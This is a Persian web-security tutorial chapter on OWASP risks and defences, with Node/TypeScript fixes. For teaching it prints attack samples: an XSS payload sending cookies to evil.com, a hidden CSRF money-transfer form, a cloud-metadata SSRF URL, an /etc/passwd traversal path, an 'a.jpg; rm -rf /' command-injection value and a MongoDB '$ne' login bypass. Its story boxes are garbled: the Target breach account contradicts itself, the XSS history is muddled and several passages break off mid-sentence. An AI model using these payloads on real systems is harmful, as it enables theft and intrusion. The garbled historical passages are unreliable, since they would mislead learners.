# فاز ۷ — امنیت

> 🧒 **داستان:** ژوئن‌ی ۲۰۱۳، شرکتی به اسم **Target** در آمریکا خبر داد که
> کارت‌های بانکیِ حدود ۱۰۰ میلیون نفر لو رفته. یک تیم هک که در فاز ۵ دیدیم
> از یک نرم‌افزار قدیمیِ ناامن که در دیوارِ آتش‌بندیِ سیستم، یک مسیر باز جا گذاشته
> بود، شروع کرده بود و به یک آدرس درون‌سازمانی رسیده بود.
>
> نکته‌ی وحشتناک این ماجرا این بود که هیچ‌چیز **نفوذی** نبود. هیچ رمزی نشکست،
> هیچ باگِ تازه‌ای پیدا نشد. فقط یک تنظیم اشتباه بود — و یک شرکتِ ۲۹۰ هزار
> نفره، ۱۸ ماه زودتر از آنچه باید، خبردار شد.
>
> نکته‌ی دوم این بود که **خودِ شرکت** روزها بعد خبردار شد — نه هکرها.
> در حالی که سازمان فهرستی از ده خطرِ برترِ وب منتشر می‌کند، در همه‌ی این سال
> دقیقاً همان ده تا اتفاق افتاده‌اند. تقریباً بدون استثنا.
>
> این فاز از همان سؤال شروع می‌شود: نه «چه حمله‌هایی وجود دارد»، بلکه
> **«کدام‌یک از این ده تا را من امروز می‌بندم؟»»** — و چرا بیشترِ حمله‌های واقعی
> هیچ ربطی به دانشِ عمیق رمزنگاری ندارند.

## مقدمه: چرا امنیت یک فاز جداگانه است؟

امنیت **دانش نیست، عادت است**. هیچ‌کس با خواندن یک مقاله امنیتی امن نمی‌شود؛ امن می‌شوی وقتی هر بار که یک اپ می‌نویسی، این سؤالات را از خودت بپرسی.

> 💡 خبر خوب: بیشتر آسیب‌پذیری‌ها در **۵ تا ۱۰ الگوی تکرارشونده** جمع شده‌اند. اگر این فاز را خوب یاد بگیری، ۸۰٪ خطر را از بین می‌بری.

```
┌──────────────────────────────────────────────┐

│  اعتبارسنجی ورودی (Input Validation)          │  ← جلوی داده‌ی بد
├──────────────────────────────────────────────┤

├──────────────────────────────────────────────┤

```

## OWASP Top 10 — ده خطر بزرگ

**OWASP چیست؟** یک سازمان **متن‌باز و غیرانتفاعی** در حوزه‌ی امنیت نرم‌افزار است (Open Worldwide Application Security Project). OWASP ابزار و محصول نمی‌فروشد؛ کارش این است که جامعه‌ی متخصصان را دور یک سری از مخاطرات مشترکِ نرم‌افزارهای تحت وب جمع کند و بهترین شیوه‌های دفاع را منتشر کند. مشهورترین خروجی‌اش همین فهرست است:

- **OWASP Top 10:** ده آسیب‌پذیریِ پرتکرارترین و خطرناک‌ترینِ سال — که جدول پایین همین است. هر چند سال یک‌بار به‌روز می‌شود و نسخه‌ی رایج فعلی مربوط به سال ۲۰۲۱ است.
- **OWASP Cheat Sheet Series:** برگه‌های یک‌صفحه‌ای راهنما برای هر موضوع (مثلاً چک‌لیست امنیتی Node.js).

چرا این فهرست مهم است؟ چون آسیب‌پذیری‌های امنیتی بی‌شمارند، ولی **تعداد محدودی الگوی تکرارشونده** دارند. اگر همان ده تا را ببندی، بخش بزرگی از سطح حمله بسته می‌شود.

## ۱. اعتبارسنجی ورودی — سنگ‌بنای امنیت

> 🧒 **داستان این بخش:** یک نانوایی را تصور کن که درِ ورودی‌اش قفل نیست. هر کسی
> وارد می‌شود و هرچه می‌خواهد برمی‌دارد. نانوا می‌گوید «قفل نداشتیم».
> درست است — قفل نداشتید.

> اعتبارسنجی دقیقاً همین است. ورودی از بیرون می‌آید و تا وقتی بررسی نشود،
> **مهمان** است نه عضو خانواده. و بدترین حالت این است که برنامه فکر کند مهمان
> دارد و با او مثل عضو خانواده رفتار کند.

> این بخش ایده‌ی اصلیِ کل فاز است: هر چیزی که از بیرون آمده، تا وقتی نگفته‌ای
> **دقیقاً چه شکلی** باید باشد، مشکوک است.
>
> **این بخش جواب می‌دهد:** چرا اعتبارسنجی با «پاک کردنِ کاراکترهای خاص» فرق دارد،
> چه چیزی را باید **رد** کرد نه اینکه **اصلاح** کرد، و چرا سه جای متفاوت

### چرا وجود دارد؟

هر داده‌ای که از بیرون می‌آید — query string، body، header، cookie، پارامتر مسیر — **دشمن** است تا وقتی خلافش ثابت شود.

- **به زبان ساده:** هر چیزی که از در می‌آید، قبل از ورود به خانه را بازرسی کن. به عبارت دیگر: **اعتماد نکن، تأیید کن.**

### ⚠️ چرا TypeScript کافی نیست؟

```typescript
// ⚠️ TypeScript جلوی این را **نمی‌گیرد** (در زمان اجرا اتفاق می‌افتد)
const age: number = req.body.age;   // body.age می‌تواند رشته باشد → TS خبر نمی‌دهد

// ❌ یعنی این ورودی‌های بد، بی‌سروصدا از اعتبارسنجی رد می‌شوند:
{
  age: "abc",           // ❌ عدد نیست
  role: "admin",       // ❌ کاربر خودش ادمین شد!
  email: 12345,        // ❌ ایمیل نیست
  extraField: "hack"   // ❌ فیلد اضافه (Mass Assignment)
}
```

> 🔑 **قاعده:** TypeScript داده‌ی داخل برنامه را تضمین می‌کند. **Zod یا مشابه، داده‌ی ورودی از بیرون را.** هر دو لازم‌اند.

### اصل: Allowlist، نه Denylist

```
❌ Denylist: مسدود کردن ورودی‌های بد
   <script>، ../، ; DROP TABLE
   → مهاجم فقط باید یک چیز تازه پیدا کند (حالت بی‌پایان)

✅ Allowlist: پذیرش فقط آنچه مجاز است
   نام فقط حروف و عدد، حداکثر ۵۰ کاراکتر
   → هر چیزی خارج از این لیست، رد می‌شود (امن)
```

### Mass Assignment — تهدید فراموش‌شده

```typescript
// ❌ فاجعه‌بار: کاربر می‌تواند role خودش را ادمین کند
await User.create(req.body);
await db.update('users', id, req.body);
// کاربر می‌فرستد: { name: "علی", role: "admin" }
// → علی مدیر شد!

// ✅ درست: فقط فیلدهای مجاز را انتخاب کن
const { name, email } = CreateUserSchema.parse(req.body);
await User.create({ name, email });   // role اصلاً وارد نمی‌شود
```

> 🔑 این یکی از رایج‌ترین باگ‌های واقعی در سیستم‌های تولیدی است.

### IDOR — دسترسی مستقیم به object (پرتکرارترین شکلِ Broken Access Control)

**تعریف:** کوتاه‌شده‌ی *Insecure Direct Object Reference* — یعنی «ارجاع مستقیم و ناامن به یک شیء». آسیب‌پذیری‌ای است که در آن برنامه مالکیت یا مجوزِ یک منبع را بررسی **نمی‌کند** و فقط کافی می‌داند کاربر **لاگین** کرده است. نتیجه: کاربر با عوض کردن یک شناسه در آدرس، به داده‌ی کاربر دیگری دسترسی پیدا می‌کند.

- **به زبان ساده:** در رستورانی که سفارش با شماره‌ی فاکتور پیدا می‌شود، گارسون فاکتور را از روی میز برمی‌دارد و می‌دهد — بدون اینکه بپرسد این فاکتور مال میزِ کناری است یا نه.
- **به زبان فنی:** احراز هویت (Authentication) یعنی «می‌دانم تو کی هستی»؛ مجوزدهی (Authorization) یعنی «می‌دانم **حق** داری این را ببینی». IDOR وقتی رخ می‌دهد که لایه‌ی دوم جا بیفتد.

**شکل کلاسیکش:** آدرس‌هایی که شناسه‌ی عددیِ قابل حدس دارند (`/api/invoices/1042`). کاربر A لاگین است و آدرس مالکِ A را می‌داند؛ حالا به‌سادگی `/api/invoices/1043` را امتحان می‌کند. اگر سرور مالکیت را نسنجد، فاکتور نفر دیگر را برمی‌گرداند.

**دفاع (در هر درخواست، نه فقط فرانت‌اند):** مالکیت را داخل کوئری بسنج، نه بعد از آن.

```
❌ ناامن: اول بگیر، بعد چک کن
   const invoice = await db.invoice.findById(id);
   if (invoice.userId !== currentUser.id) throw new Forbidden();
   → مشکل: داده اول به برنامه کشیده شده؛ اگر فراموش کنی، نشت کرده

✅ امن: شرط مالکیت را داخل همان کوئری بگذار
   const invoice = await db.invoice.findOne({ id, userId: currentUser.id });
   if (!invoice) throw new NotFound();      // ۴۰۴ بهتر از ۴۰۳ است؛ وجودش را لو نمی‌دهد
```

> 💡 یک تست ساده برای خودت: با توکن کاربر A، آدرسِ یک منبعِ کاربر B را باز کن. باید **۴۰۳ یا ۴۰۴** بگیری، نه داده. این دقیقاً همان تستی است که در بخش «🔨 چه می‌سازی؟» آمده.

> 📌 ارتباطش با مفاهیم دیگر: IDOR در [فاز ۸](فاز-۰۸-تست-و-استقرار.md) دوباره می‌آید، چون تست امنیتیِ خودکار (Security Test) دقیقاً همین را بررسی می‌کند. ریشه‌ی IDOR، **اعتماد به شناسه‌ی آمده از کلاینت** است — شناسه‌ای که کلاینت فرستاده هیچ‌وقت مدرکِ مالکیت نیست.

## ۲. SQL Injection و NoSQL Injection

> 🧒 **داستان این بخش:** کوئریِ SQL مثل یک جمله است: «نام = «مهدی»». اگر مهدی
> خودش یک گیومه بگذارد، جمله عوض می‌شود. سال ۱۹۹۸ در مجله‌ی **Phrack**
> نخستین بار نامی برای این رفتن گذاشته شد: **SQL Injection**.
>
> در NoSQL هم همان اتفاق، با لباسِ تازه می‌افتد. جایی که انتظار یک رشته را
> داشتی، یک **شیء** می‌گیرد — و سیستم به‌جای مقایسه، **اجرا** می‌کند.
>
> یک تفاوتِ مهم: در SQL Injection همیشه به کد دسترسی داشتی. در NoSQL
> Injection گاهی فقط یک ورودیِ JSON کافی است.
>
> **این بخش جواب می‌دهد:** (در محیط تمرینیِ خودمان، نه روی سیستمِ کسی)
> هر دو نوع تزریق چطور کار می‌کنند، و چه **یک** راه ثابت برای بستن هر دو چیست.

قبلاً در [فاز ۵](فاز-۰۵-پایگاه-داده.md) عمیق پوشش داده شد. اینجا فقط خلاصه‌ی NoSQL:

```typescript
// ❌ NoSQL Injection — ورودی کاربر مستقیم به کوئری
const user = await db.collection('users').find(req.body);
// کاربر می‌فرستد: { "password": { "$ne": null } }
// → MongoDB تفسیر می‌کند: "رمز مخالف null" → هر رمزی قبول است! 😱

// ✅ درست: نوع هر فیلد را جدا بگیر و اعتبارسنجی کن
const { email, password } = LoginSchema.parse(req.body);   // هر دو string
const user = await db.collection('users').findOne({ email, password });
```

> ⚠️ `$ne`, `$gt`, `$regex` و عملگرهای مشابه در MongoDB، ورودی کاربر را به **کد** تبدیل می‌کنند.

## ۳. XSS — اسکریپت‌سازی متقابل

> 🧒 **داستان این بخش:** سایت تو یک نظر می‌گیرد و آن را همان‌طور که هست
> به صفحه می‌چسباند. یک کاربر می‌نویسد: `<script>...</script>`. و آن اسکریپت
> در مرورگرِ **هر کسی** که آن صفحه را باز می‌کند اجرا می‌شود.

> یعنی هر کاربری که به صفحه‌ی تو سر می‌زند، کدِ یک غریبه را روی سیستمِ خودش
> اجرا می‌کند. بازدیدکننده‌ها فکر می‌کنند سایت توست.
>
> تاریخش قدیمی‌تر از چیزی است که فکر می‌کنی: به یک رخداد واقعی در **یانوآر
> ۲۰۰۴** برمی‌گردد — همان روزی که یک ویروس از یک سیستمِ دانشگاهی به شبکه‌ی
> بزرگ پخش شد. اولین شکل‌هایش فقط «بازتابی» بود: همان چیزی که فرد می‌فرستاد.
>
> **این بخش جواب می‌دهد:** سه نوع XSS چه فرقی دارند، چرا escape کردن به‌تنهایی
> کافی نیست، و چرا خروجیِ امن بستگی دارد به اینکه متن است یا HTML.

### سه نوع XSS

| نوع | کجا اجرا می‌شود | مثال |
|-----|----------------|------|
| **Stored** | در دیتابیس ذخیره می‌شود، همه می‌بینند | نظر کاربر حاوی اسکریپت |
| **Reflected** | از URL می‌آید، فقط همان یک نفر می‌بیند | `?q=<script>...</script>` |
| **DOM-based** | فقط در مرورگر، بدون رفت‌وبرگشت به سرور | دستکاری `innerHTML` در جاوااسکریپت |

### XSS Stored — سنگین‌ترین نوع

```
کاربر نظر می‌نویسد:  سلامت <script>fetch('https://evil.com?c='+document.cookie)</script>
        ⬇ ذخیره در دیتابیس
سایت برای همه نمایش می‌دهد:
        ⬇ اجرا در مرورگر هر بازدیدکننده
کوکی همه سرقت می‌شود 💀
```

### دفاع سه‌لایه

**اول یک تعریف، چون این دو تا با هم اشتباه گرفته می‌شوند:**

| | **Escape (فرار دادن)** | **Sanitize (پاک‌سازی)** |
|--|---------------------|------------------------|
| **چه می‌کند** | کاراکترهای خطرناک را به شکل بی‌خطرِ خودشان درمی‌آورد | تصمیم می‌گیرد **چه چیزی اجازه دارد** بماند و بقیه را دور می‌ریزد |
| **خط دروازه** | کاراکترهای خاص مثل `<` و `>` | فهرستِ تگ‌ها و صفت‌های مجاز |
| **نتیجه** | متنِ تو **به‌صورت متن** نمایش داده می‌شود، نه کد | HTML **باقی می‌ماند** ولی خطرناکش حذف شده |
| **کِی لازم است** | تقریباً همیشه | فقط وقتی واقعاً باید HTML بپذیری |

- **به زبان ساده:** Escape یعنی **همه چیز را بی‌اثر کن** — هیچ حرف و نشانه‌ای اجازه‌ی «کار کردن» ندارد و همه فقط متن خوانده می‌شوند. Sanitize یعنی **گزینش کن** — چیزهای بی‌خطر را نگه دار و خطرناک‌ها را دور بریز. مثل فرم ورودی: Escape یعنی روی هر چیزی که کاربر تایپ کرد مهر «متن» بزنی تا هیچ‌چیز قابل‌اجرا نشود؛ Sanitize یعنی تگ‌های مجاز را نگه داری و تگ `script` را حذف کنی.
- **به زبان فنی:** Escape یک تبدیل کاراکتر-به-کاراکتر است و به «محتوا» آگاه نیست — `<b>` را هم به متن تبدیل می‌کند. Sanitize یک تحلیل ساختاری است که درخت DOM را می‌پیماید و بر اساس allowlist تصمیم می‌گیرد چه چیزی بماند. پس **sanitize جایگزین escape نیست؛ لایه‌ی اضافه روی آن است.** Escape می‌پرسد «چطور این متن بی‌خطر شود؟» و sanitize می‌پرسد «کدام HTML اجازه‌ی ماندن دارد؟».

> 🔑 **قاعده:** اول escape، اگر واقعاً HTML لازم شد، آن‌وقت sanitize. هیچ‌وقت به‌جای escape از sanitize استفاده نکن.

**۱. Escape هنگام خروج (مهم‌ترین دفاع)**

```html
<!-- ❌ HTML خام در قالب‌های قدیمی -->
<div th:utext="${comment.body}"></div>     <!-- u = unescaped -->

<!-- ✅ escape خودکار -->
<div th:text="${comment.body}"></div>
<p>{comment.body}</p>                          {/* React: escape خودکار */}
```

**۲. Sanitize برای HTML مجاز**

**DOMPurify چیست؟** کتابخانه‌ای شناخته‌شده و پرکاربرد که **همان sanitize** را انجام می‌دهد: HTML را می‌گیرد، آن را به‌عنوان DOM باز می‌کند، و فقط تگ‌ها و صفت‌هایی را که تو اجازه داده‌ای نگه می‌دارد. مزیتش این است که فهرستِ تگ‌های خطرناک را خودش به‌روز نگه می‌دارد، پس لازم نیست خودت فهرست تگ‌های بد را حدس بزنی. (بسته‌ی `isomorphic-dompurify` همین ابزار است برای هر دو محیط مرورگر و Node.js.)

```typescript
import DOMPurify from 'isomorphic-dompurify';

// وقتی واقعاً باید HTML بپذیری (ویرایشگر غنی)
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'ul', 'li', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOWED_URI_REGEXP: /^(https?|mailto):/i,   // ⭐ جلوی javascript: را می‌گیرد
});
```

**۳. CSP — سپر آخر**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';                # ← هیچ اسکریپت بیرونی
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';
  object-src 'none';
```

> 💡 **نکته‌ی کلیدی:** CSP با `script-src 'self'` یعنی حتی اگر XSS تزریق شود، **اسکریپت اجرا نمی‌شود** چون از دامنه‌ی خودت نیست. این آخرین سپر است.

```html
<!-- ✅ جلوگیری از کلیک‌ربایی (Clickjacking) -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">
<!-- یا معادلش: -->
<meta name="X-Frame-Options" content="DENY">
```

## ۴. CSRF — جعل درخواست بین‌سایتی

> 🧒 **داستان این بخش:** کاربر در سایت بانکی‌اش وارد شده. بعد در تبِ کناری، صفحه‌ای
> را باز می‌کند که یک فرمِ پنهان دارد و همان لحظه ارسالش می‌کند. مرورگر
> کوکیِ بانک را هم می‌فرستد — چون خودش نمی‌داند که این درخواست از جای دیگری آمده.
>
> مشکل ریشه‌ای این است: مرورگر یک راهِ ساده دارد که بگوید «این درخواست از کجا
> آمد». فقط کافی است سرور به آن نگاه کند. خیلی از سرورها **نمی‌کنند**.

> راه‌حل: کوکیِ نشست را طوری بساز که **قابل خواندن از جای دیگر نباشد**، و
> کوکی‌ها را `SameSite` کن — یعنی به مرورگر بگو از سایتِ دیگر نفرست.
>
> **این بخش جواب می‌دهد:** CSRF دقیقاً از کدام اعتمادِ کور سوءاستفاده می‌کند، و
> چرا توکن CSRF (که خواندنش غیرممکن است) با کوکیِ `SameSite` فرق دارد.

### تفاوت XSS و CSRF — حیاتی

| | XSS | CSRF |
|--|-----|------|
| **ایده** | کد تو را اجرا می‌کنم | از تو استفاده می‌کنم بی‌خبرت |
| **نیاز به** | اسکریپت در صفحه‌ی تو | فقط کاربر لاگین باشد |
| **دفاع اصلی** | Escape | توکن CSRF / SameSite |

```
کاربر در سایت بانک لاگین است: bank.com
        ⬇
در تب دیگر صفحه‌ی مهاجم را باز می‌کند: evil.com
        ⬇
آن صفحه (پنهان):
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker">
      <input name="amount" value="1000000">
    </form>
    <script>document.forms[0].submit()</script>
        ⬇
مرورگر کوکی bank.com را **خودکار** ارسال می‌کند
        ⬇
💸 یک میلیون تومان منتقل شد
```

### دفاع

```typescript
// ① SameSite — ساده‌ترین و مؤثرترین
res.cookie('session', token, {
  httpOnly: true,
  sameSite: 'strict',     // ⭐ در درخواست‌های cross-site اصلاً ارسال نمی‌شود
  secure: true,
});
// sameSite: 'strict' → حداکثر محافظت، ولی لینک‌های خارجی به سایتت کار نمی‌کند
// sameSite: 'lax'    → فقط درخواست‌های top-level GET ارسال می‌شود (پیشنهاد)
// sameSite: 'none'   → بدون محافظت CSRF، فقط اگر واقعاً لازم داری

// ② توکن CSRF — لایه‌ی دوم
app.use(csrf({ cookie: { httpOnly: true, sameSite: 'lax' } }));
```

> 🔑 **`SameSite: 'lax'`** در سال‌های اخیر به‌صورت پیش‌فرض در همه‌ی مرورگرهای مدرن فعال شده و **بیشتر حملات CSRF را بدون هیچ کد اضافه‌ای** متوقف می‌کند. ولی برای APIهای حساس، توکن CSRF هم بگذار.

### 🔴 CSRF در برابر APIهای مبتنی بر Token

اگر توکن در **هدر** `Authorization` بفرستی (نه کوکی)، مرورگر آن را **خودکار** اضافه نمی‌کند — پس CSRF عملاً ممکن نیست. ولی در آن صورت توکن در localStorage ذخیره می‌شود و XSS خطرناک می‌شود.

> **جمع‌بندی:** یک معامله‌ی امنیتی است:
> - توکن در کوکی HttpOnly → مصون از XSS، ولی نیازمند محافظت CSRF
> - توکن در هدر + localStorage → مصون از CSRF، ولی آسیب‌پذیر در برابر XSS
>
> راه‌حل عملی: **کوکی HttpOnly + SameSite + توکن CSRF + CSP سخت‌گیرانه + خروجی escape‌شده.**

## ۵. SSRF — سرور به‌جای تو درخواست می‌فرستد

> 🧒 **داستان این بخش:** سایت تو کاری می‌کند که آدرس یک عکس را از کاربر می‌گیرد و
> خودش آن را می‌آورد. مشکل این است که **سرور تو** می‌آورد، نه مرورگرِ کاربر.
> و سرور تو معمولاً به جاهایی دسترسی دارد که کاربر ندارد.

> یعنی کاربر می‌نویسد `http://169.254.169.254/...` — نشانی ویژه‌ای که در
> سرویس‌های ابری، اطلاعاتِ حساب و کلیدهای موقت نگه داشته می‌شود. کاربر از
> بیرون به آن دسترسی ندارد، ولی سرور تو دارد.
>
> پس مهاجم لازم نیست سیستم تو را بشکند. کافی است اجازه بدهد سرور تو از
> داخل، جایی را باز کند که در را برایش باز کرده‌اند.
>
> **این بخش جواب می‌دهد:** SSRF چطور به یک نشانیِ درونی تبدیل می‌شود، چرا
> «فقط `http` و `https` را قبول کن» کافی نیست، و فهرستِ سیاهِ آدرس‌ها چه

```
کاربر می‌فرستد:  { "imageUrl": "http://169.254.169.254/latest/meta-data/" }
        ⬇
سرور فکر می‌کند: "باید تصویر را دانلود کنم"
        ⬇
سرور واقعاً درخواست می‌فرستد — به Metadata سرویس ابری!
        ⬇
💀 کل اطلاعات سرور لو رفت (کلیدها، توکن‌ها)
```

- **به زبان ساده:** مثل اینکه به یک نفر بگویی «برو خانه‌ی این آدرس را بگردان». ولی آدرس، خانه‌ی خودت است و کلیدها داخلش.

### دفاع

```typescript
async function safeFetch(url: string) {
  const parsed = new URL(url);

  // ① فقط HTTPS و دامنه‌های مجاز
  if (parsed.protocol !== 'https:') throw new Error('فقط HTTPS');
  const ALLOWED_DOMAINS = ['cdn.myapp.com', 'images.myapp.com'];
  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
    throw new Error('دامنه مجاز نیست');
  }

  // ② IP داخلی نباشد — و تازه، DNS rebinding هم باید چک شود
  const resolved = await dns.lookup(parsed.hostname);
  if (isPrivateIP(resolved)) throw new Error('IP داخلی ممنوع');

  // ③ ریدایرکت را دنبال نکن — دلیلش دو خط پایین‌تر توضیح داده شده
  //
  // ⭐ چرا گفتیم DNS rebinding هم باید چک شود؟ چون چکِ بالا یک بار انجام
  //    می‌شود و بعد می‌میرد. در DNS rebinding، مهاجم دامنه‌اش را طوری تنظیم
  //    می‌کند که اولین DNS lookup آدرس عمومی بدهد (چک تو رد می‌شود)، و
  //    lookup دوم — که خودِ درخواست HTTP انجام می‌دهد — آدرس داخلی بدهد
  //    (و به سرور داخلی می‌رسد). یعنی بررسی روی کاغذ درست بود ولی بین
  //    بررسی و استفاده، داده عوض شد. دفاع درست: وصله را طوری بنویس که خودِ
  //    برنامه به IP نهایی وصل شود، یا بعد از بررسی، دوباره رزروِ اتصال بگیر.
  return fetch(url, { redirect: 'manual' });
}

function isPrivateIP(ip: string): boolean {
  return ip.startsWith('127.')      // loopback
      || ip.startsWith('10.')       // private
      || ip.startsWith('192.168.')  // private
      || ip.startsWith('172.16.')   // private
      || ip.startsWith('169.254.'); // ⚠️ cloud metadata!
}
```

> ⚠️ آدرس `169.254.169.254` را **همیشه** مسدود کن. تقریباً همه‌ی سرویس‌های ابری (AWS، GCP، Azure، DigitalOcean) اینجا اطلاعات حساس دارند.

## ۶. Path Traversal — فرار از پوشه

> 🧒 **داستان این بخش:** یک سایت عکس‌ها دارد و آدرس عکس را از آدرس صفحه می‌خواند.
> اگر کسی به‌جای نام عکس بنویسد `../../../etc/passwd`، برنامه سه پوشه می‌رود
> بالا و فایلی را می‌خواند که اصلاً ربطی به عکس ندارد.
>
> این کار ساده‌ترین شکلِ «فقط به ورودی اعتماد نکن» است. برنامه فکر می‌کند دارد
> یک نام فایل می‌گیرد؛ ولی در واقع دارد به او یک **مسیر** می‌دهد.
>
> نکته‌ی مهم: `..` در یک مسیر همیشه به یک جا اشاره دارد — ولی **کدام** جا، به
> سیستم‌عامل بستگی دارد. پس اگر روی ویندوز اجرا شود، `/` و `\` هر دو جداکننده‌اند.
>
> **این بخش جواب می‌دهد:** چرا حذفِ `..` کافی نیست، چرا باید مسیر را بعد از
> **حل** کرد بررسی کرد (نه قبل)، و چرا بهترین دفاع، نگه‌داشتنِ فایل در جایی

**تعریف:** وقتی ورودی کاربر داخل **مسیر فایل** می‌نشیند و آن مسیر را از پوشه‌ی مجاز بیرون می‌برد، Path Traversal گفته می‌شود.

- **چرا وجود دارد:** کاربر نباید بتواند بگوید «این فایل را نشانم بده» و تو فایلی بیرون از پوشه‌ی مجاز را باز کنی. اگر باز کند، هر چیزی که کاربرِ سرویس بتواند بخواند — از جمله فایل تنظیمات و کلیدها — برای او قابل خواندن می‌شود.
- **به زبان ساده:** نامه‌ای که آدرسش «پوشه‌ی دفتر، اتاق ۳، کشوی بالا» است. اگر به‌جای شماره‌ی اتاق، به کاربر اجازه بدهی خودش بنویسد «اتاق‌ها را از در رد شو تا لاباری کنی»، از محدوده‌ی ساختمان بیرون رفته‌ای.
- **به زبان فنی:** کاراکترهای `..` و `/` در ورودی، پس از الحاق به رشته، **نرمال‌سازی مسیر** می‌شوند و `پوشه/../../etc/passwd` به `/etc/passwd` تبدیل می‌شود. دفاع اصلی: مسیر نهایی را با `path.resolve` بساز، بعد با `path.resolve(cwd, userPath).startsWith(cwd)` چک کن که هنوز داخل پوشه است. کشیدن نویسه‌های `.` یا `/` به‌تنهایی کافی نیست چون URL-decode و یونیکدِ یکسان می‌توانند دوباره آن‌ها را بسازند.

```javascript
// ❌ کاربر: /api/files?name=../../../../etc/passwd
app.get('/api/files', (req, res) => {
  const path = `./uploads/${req.query.name}`;   // 💀 فرار از پوشه!
  res.sendFile(path);
});
```

```typescript
// ✅ درست: مسیر را نرمال کن و بررسی کن که داخل پوشه‌ی مجاز مانده
import path from 'path';
import fs from 'fs/promises';

const UPLOAD_DIR = path.resolve('./uploads');

async function serveFile(name: string) {
  // ① basename حذف هر مسیری می‌کند
  const safeName = path.basename(name);

  // ② بساز و مطمئن شو داخل UPLOAD_DIR است
  const fullPath = path.resolve(UPLOAD_DIR, safeName);
  if (!fullPath.startsWith(UPLOAD_DIR + path.sep)) {
    throw new ForbiddenError('مسیر غیرمجاز');
  }

  const content = await fs.readFile(fullPath);
  res.type(contentTypeFor(safeName)).send(content);
}
```

## ۷. Command Injection — اجرای دستور سیستمی

> 🧒 **داستان این بخش:** برنامه می‌خواهد یک تصویر را کوچک کند و برای همین
> یک فرمان سیستمی می‌سازد و اجرا می‌کند. ورودی کاربر داخل همان فرمان می‌نشیند.
>
> تفاوتِ ظریف با SQL Injection این است: آنجا زبانِ پرسش، اجرا نمی‌شد؛ خودِ پرسش
> داده را تغییر می‌داد. اینجا **سیستم‌عامل** فرمان را اجرا می‌کند. یعنی هرچه کاربر
> بنویسد، اجرا می‌شود.
>
> مشکل ریشه‌ای: برنامه‌نویس دو چیز را قاطی کرد — داده و دستور. تا وقتی این دو
> در یک رشته مخلوط‌اند، هر ورودی یک دستورِ جدید است.
>
> **این بخش جواب می‌دهد:** (فقط در محیط تمرینیِ خودمان) تفاوت Command
> Injection با Code Injection چیست، و چرا راه درست، **پاس دادن آرگومان به‌جای
> ساختن رشته** است.

**تعریف:** وقتی ورودی کاربر به یک **دستور سیستمی** که به shell سپرده می‌شود تزریق شود، Command Injection گفته می‌شود.

- **چرا وجود دارد:** `shell` ورودی را به **دستورهای جدا** می‌شکند و خودش اجرا می‌کند. نویسه‌هایی مثل `;` و `&&` و `|` و `` ` `` و `$()` که به آن‌ها **shell metacharacter** (نویسه‌های کنترلی shell) می‌گویند، پایان دستور را اعلام می‌کنند و دستور بعدی را شروع می‌کنند. پس کاربری که اسم فایل را می‌فرستد، در واقع می‌تواند دستور اجرا کند.
- **به زبان ساده:** به‌جای اینکه به رستوران بگویی «برای من یک چای بیاور»، نوشته‌ای: «یک چای بیاور؛ در ضمن کل یخچال رو هم خاموش کن». یک علامت نقطه‌ویرگول، درخواستت را به دستور دوم تبدیل کرد.
- **به زبان فنی:** راه‌حل **عبور نکردن از shell** است. `exec` رشته را به `sh -c` می‌دهد و آن‌جا تفسیر می‌شود؛ `execFile` مستقیم فرمان را صدا می‌زند و ورودی را فقط یک آرگومان string می‌بیند، پس `;` در آن هیچ معنایی ندارد. ورودی کاربر **هرگز** نباید داخل رشته‌ی فرمان بنشیند.

```typescript
// ❌ NEVER: ورودی کاربر به shell
const { exec } = require('child_process');
exec(`convert ${req.query.file} -resize 100x100 out.png`);
// ورودی: `file = "a.jpg; rm -rf /"` → فاجعه

// ✅ execFile با آرگومان جدا — از shell عبور نمی‌کند
import { execFile } from 'child_process';
import { promisify } from 'util';
const run = promisify(execFile);

await run('convert', [inputPath, '-resize', '100x100', outputPath]);
// ↑ حتی اگر ورودی شامل shell metacharacter باشد، فقط یک آرگومان string است
```

> 🔑 **قاعده:** `exec` هیچ‌وقت با ورودی کاربر. `execFile` یا `spawn` با آرگومان آرایه‌ای. یا بهتر: کتابخانه‌ی تخصصی به‌جای ابزار خط فرمان.

## ۸. Rate Limiting و Brute Force

> 🧒 **داستان این بخش:** کلیدِ یک قفل معمولی ده‌ها ترکیب دارد و هزار بار
> امتحان کردنش ممکن است. ولی قفلِ حسابِ بانکی شماره‌هایی به‌درد‌بخور را می‌پذیرد که
> **میلیاردها** حالت دارند. پس سرعت، تنها چیزی است که می‌تواند جلوی حمله را بگیرد.
>
> این تکنیک اسمش **Brute Force** است: آرام و پیوسته، هر ترکیب را به نوبت.
> راه‌حلش ساده است و ارزان: در هر بازه، بیشتر از N تلاش را قبول نکن.
>
> ولی یک تله دارد: اگر تنها از روی IP بشماری، پشت CDN همه یک IP هستند. و اگر
> زیادی سخت‌گیر باشی، کاربرِ واقعی هم بیرون می‌ماند.
>
> **این بخش جواب می‌دهد:** Rate limit کجا باید بنشیند، چه کلیدی برای شمارش
> درست است، و چطور طوری محدود کنیم که مهاجم دور بزند ولی کاربرِ واقعی نه.

در [فاز ۳](فاز-۰۳-معماری-و-فریم‌ورک-وب.md) الگوهای rate limit را یاد گرفتی. اینجا **کجاها** لازم است — و اول سه اصطلاحی که در جدول‌های همین بخش می‌بینی:

**تعریف Brute Force (جست‌وجوی فراگیر):** حمله‌ای که در آن رمز را **یکی‌یکی و بی‌وقفه** حدس می‌زنند تا درست از آب دربیاید. کلیدش تعداد تلاش است: اگر رمز ۶ رقمی باشد، بدترین حالت یک میلیون حدس است. به همین دلیل رمزهای کوتاه و قابل‌حدس (۴ رقمی، «۱۲۳۴۵۶»، نام خودت) عملاً بی‌دفاع‌اند. تنها پاسخ مؤثر، **محدود کردن تعداد تلاش** و طولانی کردن فرایند ورود (مانند MFA) است.

